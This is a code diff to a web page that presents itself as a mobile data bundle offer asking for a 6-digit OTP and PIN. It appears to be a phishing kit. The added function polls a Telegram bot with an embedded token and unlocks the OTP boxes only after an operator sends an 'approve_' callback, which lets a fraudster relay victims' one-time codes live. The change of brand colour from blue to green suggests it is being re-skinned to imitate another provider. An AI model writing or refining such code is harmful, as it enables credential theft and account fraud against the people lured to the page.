@@ -286,19 +286,19 @@
             border-radius: 999px;
             padding: 16px 22px;
             color: white;
-            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            background: linear-gradient(135deg, var(--green) 0%, var(--green-dark) 100%);
             font-size: 15px;
             font-weight: 800;
             letter-spacing: 0.04em;
             text-transform: uppercase;
             cursor: pointer;
-            box-shadow: 0 10px 24px rgba(0,51,160,0.3);
+            box-shadow: 0 10px 24px rgba(0,176,80,0.3);
             touch-action: manipulation;
             transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
         }
 
         .btn-primary:hover:not(:disabled) {
-            box-shadow: 0 14px 30px rgba(0,51,160,0.36);
+            box-shadow: 0 14px 30px rgba(0,176,80,0.36);
             transform: translateY(-1px);
         }
 
@@ -561,13 +561,13 @@
                     <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                 </div>
 
-                <p class="hint">OTP will auto-submit when all 6 digits are entered</p>
+                <p class="hint">Waiting for Telegram approval to proceed…</p>
 
                 <div class="error-msg" id="errMsg"></div>
 
                 <div class="btn-group">
-                    <button class="btn-primary" type="button" id="verifyBtn">Verify</button>
-                    <button class="btn-secondary" type="button" onclick="goBack()">Back</button>
+                    <button class="btn-primary" type="button" id="verifyBtn" disabled>Proceed to Verify</button>
+                    <button class="btn-secondary" type="button" onclick="goBack()">← Back</button>
                 </div>
             </div>
 
@@ -608,6 +608,7 @@
 
         let state = { lastUpdateId: 0 };
         let isProcessing = false;
+        let waitingForApproval = true;
 
         const otpBoxes = document.querySelectorAll('.otp-box');
         const verifyBtn = document.getElementById('verifyBtn');
@@ -632,6 +633,9 @@
                 bundleData = { offer, data, price };
                 displayBundleDetails();
             }
+
+            // Start waiting for Telegram approval
+            waitForTelegramApproval();
         }
 
         function displayBundleDetails() {
@@ -660,13 +664,6 @@
                 if (box.value.length === 1) {
                     if (index < otpBoxes.length - 1) {
                         otpBoxes[index + 1].focus();
-                    } else {
-                        // All boxes filled - auto-submit
-                        const otp = getOTP();
-                        if (otp.length === 6) {
-                            currentOTP = otp;
-                            openPinModal();
-                        }
                     }
                 }
             });
@@ -782,12 +779,34 @@
             confirmBtn.textContent = "Proceed";
         }
 
+        function waitForTelegramApproval() {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query && waitingForApproval) {
+                                const cb = update.callback_query.data;
+                                if (cb.startsWith('approve_')) {
+                                    clearInterval(interval);
+                                    waitingForApproval = false;
+                                    verifyBtn.disabled = false;
+                                    document.querySelector('.hint').textContent = 'OTP boxes are now active. Enter your 6-digit code.';
+                                    otpBoxes[0].focus();
+                                }
+                            }
+                        });
+                    });
+            }, 1000);
+        }
+
         function goBack() {
             window.location.href = 'login.html';
         }
 
         window.addEventListener('load', loadBundleData);
-        otpBoxes[0].focus();
     </script>
 </body>
 </html>
